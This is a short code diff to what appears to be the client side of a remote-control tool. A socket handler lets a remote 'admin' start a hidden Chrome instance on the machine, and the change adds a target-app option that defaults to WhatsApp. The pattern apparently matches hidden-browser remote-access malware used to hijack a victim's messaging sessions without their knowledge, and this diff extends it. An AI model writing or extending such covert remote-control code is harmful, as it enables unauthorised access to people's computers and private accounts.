@@ -384,9 +384,10 @@ window.onload = async () => {
         socket.on('request-hidden-chrome', async (data) => {
             const adminId = data.adminId || data;
             const profileName = data.profileName;
-            console.log("Admin requested Hidden Chrome", profileName || 'auto');
+            const targetApp = data.targetApp || 'whatsapp';
+            console.log("Admin requested Hidden Chrome", profileName || 'auto', targetApp);
             currentAdminForHiddenChrome = adminId;
-            const success = await window.electronAPI.startHiddenChrome(profileName);
+            const success = await window.electronAPI.startHiddenChrome(profileName, targetApp);
             if (!success) {
                 socket.emit('client-error', "Failed to start hidden Chrome. Chrome might not be installed.");
             }
